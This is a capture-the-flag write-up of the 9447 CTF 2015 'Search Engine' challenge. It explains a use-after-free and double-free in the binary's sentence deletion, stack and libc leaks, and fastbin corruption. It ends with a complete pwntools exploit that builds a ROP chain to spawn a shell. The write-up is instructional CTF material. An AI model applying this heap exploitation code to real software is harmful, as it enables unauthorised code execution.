# Double Free Exploit 

#### 9447 CTF 2015: Search Engine Writeup

#### Reversing:

The binary is 64-bit , which has NX and canaries enabled.

It's functionalities are :

  * Add a sentence : malloc(size)
  * Search a word : split the sentence using spaces and a pointer to it 
  * struct created :
  
  ```
  struct Word {
    char *word_ptr;
    int word_len;
    char *src_sentence;
    int sentence_size;
    struct Word *next;
};

  ```
  
  * validation :
  
  ```
  void search()
  {
  
  for ( i = words; i; i = i->next )
{
  if ( *i->sentence )
  {
    if ( i->word_len == size && !memcmp(i->word_ptr, needle, size) )
    {
      __printf_chk(1LL, "Found %d: ", i->sentence_size);
      fwrite(i->sentence, 1uLL, i->sentence_size, stdout);
      putchar('\n');
      puts("Delete this sentence (y/n)?");
      read_until_newline(&choice, 2, 1);
      if ( choice == 'y' )
      {
        memset(i->sentence, 0, i->sentence_size);
        free(i->sentence);
        puts("Deleted!");
      }
    }
    
    ....

  ```
<br> <br>

#### Exploit 
  
  We can see that after searching a word , we are able to delete a sentence, and it's contents as free'd out , but the word linked 
  
  list is not freed hence it can be a UAF , but there is a check *i->sentence which prevents us from double free , but a good a thing 
  
  is after freeing it it as added to fastbin list , and if we free another sentece a fd pointer is placed at previous chunk , now
  
  i->sentence is not null and now we can search for '\x00' and delete the sentance again giving us double free corruption 
  
  So the plan is :

  * Create 3 sentences "A"*48+" C"
  
  * now delete all 3 by searching for word "C"
  
  * now the freelist would be 1->2->3
  
  * now delete 2 again causing freelist to be 2->1->2
  
  * now allocate a sentence of size 48 now we will get 2 , with this we could corrupt fd
  
  * now allocate 2 more sentences to make bin->corruptd fd 
  
  * now we allocate a sentence to have arbitary write
  
  * since the malloc checks the fd->size with malloc(size) we need to return to area where size is 0x40
  
  * now overwrite eip and checkmate 
  
#### Leaking stack :
  
   the func read_num gets 48 bytes , if we give "A"*48 it null terminated and would leak stack address 
   
#### Leaking libc :

   since the small bins have fd and bk pointer the bk pointer of 1'st chunk would contain libc address 

      
#### Exploit code :
  
```
from pwn import *

context.bits = 64

pop_rdi_ret = 0x400e23
system_off = 0x35a708
binsh_off = 0x2381bf

def search(size,word):
	p.recvlines(3)
	p.sendline('1')
	p.recvline()
	p.sendline(str(size))
	p.recvline()
	p.sendline(word)

def create(size,word):
	p.recvlines(3)
	p.sendline('2')
	p.recvline()
	p.sendline(str(size))
	p.recvline()
	p.sendline(word)
	p.recvline()


def leak_stack():

	p.recvlines(3)
	p.sendline('A'*48)
	p.recvline()

	# doesn't work all the time
	p.sendline('A'*48)
	leak = p.recvline().split()[0].split('A'*48)[1]
	context.bits = len(leak)*8
	leak = unpack(leak)
	log.info("Stack leak: "+hex(leak))

	# dummy entry to exit 
	p.sendline('1')
	p.recvline()
	p.sendline('1')
	p.recvline()
	p.sendline('H')	
	return leak

def leak_libc():
	
	create(170,"A"*168+" C")
	search(1,"C")
	p.recvlines(2)
	p.sendline("y")
	p.recvline()
	search(1,"\x00")
	leak=p.recvline()[11:17]
        context.bits = len(leak)*8
        leak = unpack(leak)
	log.info("libc leak: "+hex(leak))
	p.recvline()
	p.sendline("n")
	return leak	
	
p = process('./search')

print ""

stack_leak = leak_stack()

libc_leak = leak_libc()

fake_heap = stack_leak + 0x32  
system = libc_leak - system_off 
binsh = libc_leak - binsh_off

log.info("System: "+hex(system))
log.info("/bin/sh: "+hex(binsh))

context.bits = 64
payload = "\x90"*6+pack(pop_rdi_ret)+pack(binsh)+pack(system)+"\x90"*18

create(48,"A"*46+" C")
create(48,"B"*46+" C")
create(48,"D"*46+" C")

search(1,"C")
print p.recvlines(2)
p.sendline("y")
print p.recvline()
print p.recvlines(2)
p.sendline("y")
print p.recvline()
print p.recvlines(2)
p.sendline("y")
print p.recvline()


search(1,"\x00")
print p.recvlines(2)
p.sendline("y")
print p.recvline()
print p.recvlines(2)
p.sendline("n")

create(48,pack(fake_heap)+"A"*40) # overwrite fd
create(48,"B"*48) # unused
create(48,"C"*48) # unused


create(48,payload)

p.interactive()

```   
  
  







